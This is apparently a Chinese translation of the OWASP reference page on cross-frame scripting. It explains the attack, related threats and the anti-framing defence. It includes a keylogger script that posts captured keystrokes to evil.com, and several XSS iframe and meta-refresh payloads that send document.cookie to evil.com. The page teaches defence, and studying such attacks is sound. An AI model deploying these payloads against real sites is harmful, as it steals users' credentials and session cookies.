[TOC]

翻译自[Cross Frame Scripting](https://www.owasp.org/index.php/Cross_Frame_Scripting "Cross Frame Scripting")

# 漏洞描述
跨框架脚本（XFS）是一种将恶意JavaScript与加载合法界面的iframe结合的攻击，旨在从不知情的用户窃取数据。。这种攻击只有与社会工程学才会成功。一个示例，攻击者诱导用户访问攻击者控制的网页。攻击者网页随后加载恶意JavaScript和一个指向合法页面HTML iframe。一旦用户在iframe内的合法网站输入了凭据，恶意JavaScript将窃取之。

# 风险因素
标准浏览器安全模型允许来自一个网页的JavaScript访问其他页面的内容，这些页面在不同的浏览器窗口或框架中加载，只要这些其他页面已从相同来源的服务器或域加载。它不允许访问已在其他域或服务器加载的页面。（参见MSDN的文章 [About Cross-Frame Scripting and Security](http://msdn.microsoft.com/en-us/library/ms533028%28VS.85%29.aspx "About Cross-Frame Scripting and Security")）。但是，特定浏览器中存在此安全模型中的特定错误，允许攻击者访问从不同服务器或域加载的页面中的一些数据。其中最为知名的影响IE的漏洞，该漏洞使IE浏览器跨HTML框架集泄漏键盘事件（请参阅iDefense Labs咨询[Microsoft Internet Explorer跨框架脚本限制绕过](http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=77 "Microsoft Internet Explorer跨框架脚本限制绕过")）。例如，此漏洞可能允许攻击者窃取浏览器用户的登录凭据，因为他或她尝试将其输入到第三方网页的登录表单中。

# 攻击示例

## XFS针对IE的攻击
为了利用跨框架泄漏键盘事件的IE漏洞，攻击者可能在攻击者控制的evil.com上创建一个网页，并在恶意网页上包含一个可见框架，显示example.com的登录页面。攻击者可以隐藏框架的边框并将框架展开以覆盖整个页面，从而使浏览器用户看起来像他或她实际上正在访问example.com。攻击者在主恶意网页上注册一些javascript，该页面侦听用于页面上的所有关键事件。通常情况下，这个监听器只会收到来自主恶意网页的事件的通知 - 但是由于浏览器的错误，这个监听器也会被通知来自框架化的example.com页面的事件。因此，在尝试登录example.com时，浏览器用户在example.com框架中按下的每个按键都可以被攻击者捕获，并报告给evil.com：

```http
<!-- http://evil.com/example.com-login.html -->
<head>
<script>
// 用户按键阵列
var keystrokes = [];
// 捕获用户击键的事件监听器
document.onkeypress = function() {
    keystrokes.push(window.event.keyCode);
}
// 函数每秒钟都会将击键报告给evil.com
setInterval(function() {
    if (keystrokes.length) {
        var xhr = newXHR();
        xhr.open("POST", "http://evil.com/k");
        xhr.send(keystrokes.join("+"));
    }
    keystrokes = [];
}, 1000);
// 函数创建一个ajax请求对象
function newXHR() {
    if (window.XMLHttpRequest)
        return new XMLHttpRequest();
    return new ActiveXObject("MSXML2.XMLHTTP.3.0");
}
</script>
</head>
<!-- 重新聚焦到这个框架使浏览器陷入泄漏事件 -->
<frameset onload="this.focus()" onblur="this.focus()">
<!-- 嵌入example.com登录页面的框架 -->
<frame src="http://example.com/login.html">
</frameset>
```

## 使用框架的XSS攻击
要在example.com的第三方网页上利用跨站点脚本漏洞，攻击者可以在evil.com上创建一个攻击者控制的网页，并在evil.com页面中包含一个隐藏的iframe。这个iframe加载有漏洞的的example.com页面，并通过XSS漏洞向其中注入一些脚本。在此示例中，example.com从页面内容的页面URL中打印“q”查询参数的值，而不会转义该值。这允许攻击者在example.com页面中注入一些JavaScript代码，窃取浏览器用户的example.com的cookie，并通过一个虚假图像请求将cookie发送给evil.com（iframe的src URL为了易读性被包裹）:

```JavaScript
<iframe style="position:absolute;top:-9999px" src="http://example.com/↵
    flawed-page.html?q=<script>document.write('<img src=\"http://evil.com/↵
    ?c='+encodeURIComponent(document.cookie)+'\">')</script>"></iframe>
```
iframe隐藏在屏幕外，因此浏览器用户不知道他或她只是“访问”了example.com页面。然而，这种攻击实际上与传统的XSS攻击相同，因为攻击者可以使用各种方法将用户直接重定向到example.com页面，包括像这样的meta元素（同样，meta元素的URL为了易读性被包裹）：

```JavaScript
<meta http-eqiv="refresh" content="1;url=http://example.com/↵
    flawed-page.html?q=<script>document.write('<img src=\"http://evil.com/↵
    ?c='+encodeURIComponent(document.cookie)+'\">')</script>">
```

唯一的区别是iframe隐藏在屏幕外--因此浏览器用户不知道他或她只是“访问”了example.com页面。当使用重定向直接导航到example.com时，浏览器将在浏览器的地址栏中显示example.com url，并在浏览器窗口中显示example.com页面，以便浏览器用户知道他或她访问的是example.com。

## 另一个使用框架的XSS攻击
要利用与example.com相同的跨站点脚本漏洞（在页面内容中从页面URL中输出“q”查询参数的值而不会转义该值），攻击者可以在evil.com上创建一个网页 ，由攻击者控制，其中包括类似以下的链接，并诱使用户点击链接。此链接通过利用带有“q”查询参数的XSS漏洞将iframe注入example.com页面; 该iframe运行一些JavaScript来窃取浏览器用户在example.com的cookie，并通过一个虚假图像请求将它发送给evil.com（该URL为了易读性被包裹）：

```JavaScript
http://example.com/flawed-page.html?=<iframe src="↵
    javascript:document.body.innerHTML=+'<img src=\"http://evil.com/↵
    ?c='+encodeURIComponent(document.cookie)+'\">'"></iframe>
```

同样，这种攻击实际上与传统的XSS攻击相同; 攻击者只是使用注入的iframe元素的src属性作为载体在被攻击的页面中运行一些javascript代码。

# 相关的威胁代理

- XFS攻击通常由恶意攻击者执行 [类别：Internet攻击者](https://www.owasp.org/index.php?title=Category:Internet_attacker&action=edit&redlink=1 "Category:Internet attacker")
- 利用跨框架泄漏事件的浏览器错误的XFS攻击类似于使用传统密钥记录软件的攻击。

# 相关攻击类型

- 攻击者可能使用隐藏frame来执行[跨站点脚本攻击（XSS）](https://tinytracer.com/archives/owasp%e4%b8%aa%e4%ba%ba%e6%b1%89%e5%8c%96%e6%94%bb%e5%87%bb%e7%b3%bb%e5%88%97%e5%a4%a7%e5%85%a8%ef%bc%9a%e8%b7%a8%e7%ab%99%e7%82%b9%e8%84%9a%e6%9c%ac%ef%bc%88xss%ef%bc%89/ "跨站点脚本攻击（XSS）")。
- 攻击者可能使用隐藏frame来执行[跨站点请求伪造（CSRF）攻击](https://tinytracer.com/archives/%ef%bc%88owasp%e4%b8%aa%e4%ba%ba%e6%b1%89%e5%8c%96%ef%bc%89%e6%94%bb%e5%87%bb%e7%b3%bb%e5%88%97%e5%a4%a7%e5%85%a8%ef%bc%9a%e8%b7%a8%e7%ab%99%e8%af%b7%e6%b1%82%e4%bc%aa%e9%80%a0%ef%bc%88csrf%ef%bc%89/ "跨站点请求伪造（CSRF）攻击")
- 攻击者可能会使用可见frame来执行[点击劫持](https://tinytracer.com/archives/%ef%bc%88owasp%e4%b8%aa%e4%ba%ba%e6%b1%89%e5%8c%96%ef%bc%89%e6%94%bb%e5%87%bb%e7%b3%bb%e5%88%97%e5%a4%a7%e5%85%a8%ef%bc%9a%e8%b7%a8%e7%ab%99%e8%af%b7%e6%b1%82%e4%bc%aa%e9%80%a0%ef%bc%88csrf%ef%bc%89/ "点击劫持")攻击。
- 利用浏览器漏洞跨浏览器事件的XFS攻击是一种[网络钓鱼](https://www.owasp.org/index.php/Phishing "网络钓鱼")攻击形式（攻击者诱使用户在包含合法第三方页面的框架中输入敏感信息）。

# 相关的漏洞

- XFS攻击利用了特定的浏览器漏洞

# 相关防御措施

- XFS攻击可以被禁止第三方网页框架化来防止；用于执行此操作的技术与用于Java EE的[Clickjacking Protection](https://www.owasp.org/index.php/Clickjacking_Protection_for_Java_EE "Clickjacking Protection")的技术相同。

# 参考

- MSDN文章 [About Cross-Frame Scripting and Security](http://msdn.microsoft.com/en-us/library/ms533028%28VS.85%29.aspx "About Cross-Frame Scripting and Security")
- iDefense实验室咨询 [Microsoft Internet Explorer Cross Frame Scripting Restriction Bypass](http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=77 "Microsoft Internet Explorer Cross Frame Scripting Restriction Bypass")